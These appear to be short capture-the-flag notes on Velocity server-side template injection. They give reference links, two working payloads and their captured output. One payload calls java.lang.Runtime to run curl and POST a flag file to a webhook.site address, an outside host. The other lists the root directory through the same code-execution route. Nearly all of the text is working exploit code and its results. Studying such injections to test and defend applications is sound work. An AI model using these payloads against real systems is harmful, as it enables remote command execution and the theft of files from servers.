'''
Velocity SSTI

https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
https://antgarsil.github.io/posts/velocity/
https://gosecure.github.io/template-injection-workshop/#6

#set($x='')
#set($rt=$x.class.forName('java.lang.Runtime'))
#set($chr=$x.class.forName('java.lang.Character'))
#set($str=$x.class.forName('java.lang.String'))
#set($ex=$rt.getRuntime().exec('curl -X POST -d @/flaga61f3d42ac.txt https://webhook.site/5c974ed3-890a-4e1d-b558-e3c4644b3b91'))
$ex.waitFor()

#set($x='')
#set($rt=$x.class.forName('java.lang.Runtime'))
#set($chr=$x.class.forName('java.lang.Character'))
#set($str=$x.class.forName('java.lang.String'))
#set($ex=$rt.getRuntime().exec('ls /'))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end

f l a g a 6 1 f 3 d 4 2 a c . t x t h o m e l i b l i b 6 4 m e d i a m n t o p t p r o c r o o t r

flaga61f3d42ac.txt
'''
